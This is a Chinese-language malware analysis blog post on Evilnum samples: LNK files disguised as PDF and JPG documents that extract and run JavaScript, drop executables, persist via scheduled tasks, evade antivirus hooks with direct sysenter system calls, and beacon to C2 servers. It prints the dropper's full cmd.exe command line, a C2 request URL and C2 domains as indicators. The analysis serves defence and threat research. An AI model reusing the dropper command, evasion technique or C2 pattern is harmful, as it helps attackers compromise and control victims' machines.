**作者:Yenn_  
原文链接: <https://0xdf1001f.github.io/2020/12/23/Evilnum/>**

# JointAccountDCS.pdf.lnk

## 基本信息

File Name | File Size | File Type | MD5  
---|---|---|---  
JointAccountDCS.pdf.lnk | 1,269,749 Byte |  | 48cf7f7b4180b1c4fb3ac3e149917130  
  
## 动态行为

运行后在桌面创建了pdf文档并弹出了pdf阅读器打开文档

[![img](https://images.seebug.org/content/images/2021/03/16/1615865956000-1cxnov.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141352.png)

样本为.LNK文件，调用CMD执行释放出的js

[![img](https://images.seebug.org/content/images/2021/03/16/1615865957000-2lvnqw.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141411.png)

## 样本分析

### JointAccountDCS.pdf.lnk

样本为.LNK文件，命令行：

    
    
    C:\Windows\System32\cmd.exe /c path=%windir%\system32&move "JointAccountDCS.pdf.lnk        " "%tmp%\1.lnk"&type "%tmp%\1.lnk"|find "END2">"%tmp%\0.js"&wscript "%tmp%\0.js"

将自身移动到%temp%目录下，通过标志“END2”释放出js代码，调用Wscript执行js代码

[![img](https://images.seebug.org/content/images/2021/03/16/1615865957000-3vjypm.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141432.png)

[![img](https://images.seebug.org/content/images/2021/03/16/1615865957000-4iitzc.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141446.png)

从base64解码出“ddpp.exe”

判断当前运行的脚本路径是否为“C:\Users\sam\AppData\Local\Microsoft\Credentials\MediaPlayer\VideoManager\media.js”

[![img](https://images.seebug.org/content/images/2021/03/16/1615865957000-5xuemp.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141507.png)

当脚本路径不为上述时，先从文件中取出PDF文件并释放执行

[![img](https://images.seebug.org/content/images/2021/03/16/1615865957000-6tlesr.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141522.png)

创建文件夹””C:\Users\sam\AppData\Local\Microsoft\Credentials\MediaPlayer\VideoManager””

[![img](https://images.seebug.org/content/images/2021/03/16/1615865957000-7agfaq.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141557.png)

将前面释放出的0.js拷贝到C:\Users\sam\AppData\Local\Microsoft\Credentials\MediaPlayer\VideoManager\media.js

[![img](https://images.seebug.org/content/images/2021/03/16/1615865958000-8vzvwq.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141615.png)

拷贝后，将原来的%temp%\0.js删除并执行拷贝后的.js文件

[![img](https://images.seebug.org/content/images/2021/03/16/1615865959000-9brewz.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141631.png)

运行后删除掉先创建的文件夹C:\Users\sam\AppData\Local\Microsoft\Credentials\MediaPlayer\VideoManager，释放ddpp.exe到C:\Users\sam\AppData\Local\Microsoft\Credentials\MediaPlayer下

[![img](https://images.seebug.org/content/images/2021/03/16/1615865959000-10waynj.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141722.png)

创建计划任务执行释放出的ddpp.exe，参数:”QjY2MDBGMTQtNDU0Ni1BMjdELTUxQzEtOUIwMzQ3RTZFMjgw”
“NjQyNjcz” 0

[![img](https://images.seebug.org/content/images/2021/03/16/1615865959000-11ynvea.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141738.png)

删除移动后的1.lnk

[![img](https://images.seebug.org/content/images/2021/03/16/1615865960000-12vqigw.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141757.png)

### ddpp.exe

载入IDA时，PDB路径看起来很像一个正常的java程序，PDB路径：

[![img](https://images.seebug.org/content/images/2021/03/16/1615865960000-13lbeet.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141813.png)

通过GetCommandLineh获取命令行，进行反调试，样本通过判断命令行长度是否为0x22，检测是否正常按照计划任务带有参数执行，不是则退出

[![img](https://images.seebug.org/content/images/2021/03/16/1615865960000-14nxyza.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141834.png)

利用GetFileAttributes查询判断SysWOW64下的Kernel32.dll是否存在，判断系统操作位数

[![img](https://images.seebug.org/content/images/2021/03/16/1615865960000-15mrvuv.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141857.png)

获取当前系统版本

[![img](https://images.seebug.org/content/images/2021/03/16/1615865960000-16hbhfm.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141919.png)

通过GetTickCount - Sleep - GetTickCount反调试

样本直接利用SSDT索引号通过sysenter调用内核函数，不经过NTDLL的调用

通过SSDT索引号0xb3取NtOpenFile函数，再通过Sysenter进入ring0直接调用

[![img](https://images.seebug.org/content/images/2021/03/16/1615865960000-17uqkdc.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223141948.png)

Windbg中NtOpenFile的索引:

[![img](https://images.seebug.org/content/images/2021/03/16/1615865960000-18hhgqy.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223142032.png)

调用ZwReadFile读取文件自身

[![img](https://images.seebug.org/content/images/2021/03/16/1615865960000-19otvfz.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223142115.png)

从自身偏移13E07D0处开始读取，读取5E8B字节大小内容并对读取的内容进行解密并通过ZwAllocateVirtualMemory分配内存

将解密修复后的代码拷贝到申请的内存空间中，调用ZwCreateThreadEx执行函数，在新线程内通过call [eax]跳转到解密后的代码执行

[![img](https://images.seebug.org/content/images/2021/03/16/1615865961000-20hkiof.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223142221.png)

从代码中解密出Http请求相关字符串，包括User-Agent、http://corpxtech.com/c?v=4&u=、GET等

[![img](https://images.seebug.org/content/images/2021/03/16/1615865961000-21phhju.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223142244.png)

[![img](https://images.seebug.org/content/images/2021/03/16/1615865961000-22epqsa.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223142303.png)

动态获取API地址

[![img](https://images.seebug.org/content/images/2021/03/16/1615865961000-23qpwoq.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223142341.png)

创建互斥体 “Global\wU3aqu1t2y8uN”

利用运行的命令行参数组成完整的url:”[http://quotingtrx.com/c?v=4&u=QjY2MDBGMTQtNDU0Ni1BMjdELTUxQzEtOUIwMzQ3RTZFMjgw&a=NjQyNjcz&c=0](http://quotingtrx.com/c?v=4&u=QjY2MDBGMTQtNDU0Ni1BMjdELTUxQzEtOUIwMzQ3RTZFMjgw&a=NjQyNjcz&c=0)"

其中参数V=4疑似为版本号v4

[![img](https://images.seebug.org/content/images/2021/03/16/1615865961000-24huraq.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223142440.png)

准备向C2服务器发送GET请求

[![img](https://images.seebug.org/content/images/2021/03/16/1615865961000-25uphsd.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223142511.png)

# CopyIdentityLicense.jpg.lnk

## 基本信息

File Name | File Size | File Type | MD5  
---|---|---|---  
CopyIdentityLicense.jpg.lnk | 617,271 Byte |  |
d1f069c6021aba84d1fa010295312315  
  
最近上传到VT的Evilnum样本

[![img](https://images.seebug.org/content/images/2021/03/16/1615865961000-26yetqb.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223142926.png)

### CopyIdentityLicense.jpg.lnk

样本是一个.jpg.lnk文件，运行后会打开同目录下另一个.jpg文件，这次的.lnk执行的命令行代码进行了混淆，不过分析后大致流程还是相似，通过Magic
Word“VER1”去.lnk文件中遍历出js代码并释放到%temp%\wct7ZD7ASHB.dat并调用Cscript运行这个释放出的文件，文件实际上为一个.js文件

[![img](https://images.seebug.org/content/images/2021/03/16/1615865962000-27owyri.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223143115.png)

提取出的部分JS代码

[![img](https://images.seebug.org/content/images/2021/03/16/1615865962000-28zroyi.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223150536.png)

.js恶意文件会将自己移动到C:\Users\sam\AppData\Local\Microsoft\Windows\ConnectedSearches\Templates目录下并重新运行，功能为释放出一个PE文件并创建计划任务实现持久化

释放出文件C:\Users\sam\AppData\Local\Microsoft\Windows\ConnectedSearches\main.exe，并为其创建计划任务每3小时执行一次

[![img](https://images.seebug.org/content/images/2021/03/16/1615865962000-29leprv.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223151224.png)

这里与前面版本不同，V4版本直接创建计划任务执行最终阶段，而这一次计划任务的内容并不是最终阶段的载荷

计划任务执行的exe是一个SFX自解压，压缩包有密码保护，可以用计划任务中的参数将其解压出来，其中包含了两个文件，运行的是RdrCER.exe

[![img](https://images.seebug.org/content/images/2021/03/16/1615865962000-30kgidc.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223152233.png)

### RdrCER.exe

通过计划任务执行时带有参数

    
    
    "C:\Users\sam\RdrCER.exe" "RjlDMTBGMTQtQzhBRS0yQjE0LUEwODItRUMxMTg1MDA3NjM2" "devDISMWKI.tmp" "NTY5MTY5" "Ni4xLjc2MDE%3D" 0 "65C36820" "Nzc3NDU2YH55GWYDeGR2YgV8BXtyaEZXWg%3D%3D" 0

样本尽力伪装为谷歌的套件

[![img](https://images.seebug.org/content/images/2021/03/16/1615865962000-31hnjnq.png-w331s)](https://cdn.jsdelivr.net/gh/0xdf1001f/cdn@master//20201223153349.png)

接下来部分与前样本流程类似，也是通过SSDT索引号调用内核函数，解密代码，新线程中跳转执行

## IOC

C2 :

[http://corpxtech.com](http://corpxtech.com/)

[http://quotingtrx.com](http://quotingtrx.com/)

[http://msftld.com](http://msftld.com/)

[http://apple-cdrp.com](http://apple-cdrp.com/)

## 总结

1.样本直接调用Sysenter进入内核，通过mov
eax赋值SSDT索引号，通过SSDT索引号直接进入内核，这样不会调用NTDLL中的函数，可以有效绕过部分杀软在内核函数的HOOK

2.样本解密出了字符串”\??\“，在内核中打开文件时需要在路径最前加上”\??\“

3.SSDT索引号在32位下在NTDLL函数的偏移1字节处，在64位下在偏移4字节处

4.调用sysenter时，EAX为SSDT索引号，函数的参数在堆栈ESP+8处，ESP为KiFastSystemCall的返回地址，ESP+4为调用的内核函数的返回地址，ESP+8开始为函数的参数（当EIP指向sysenter时）

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1511/>

